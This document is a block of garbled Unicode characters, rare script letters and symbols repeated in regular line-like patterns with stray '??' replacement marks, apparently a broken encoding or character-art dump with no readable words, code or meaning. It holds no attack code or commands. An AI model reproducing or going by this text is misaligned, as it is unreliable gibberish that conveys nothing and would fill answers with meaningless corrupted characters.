࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬??︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬??࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛𞋬𞋬𞋬??࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬??࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬??࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬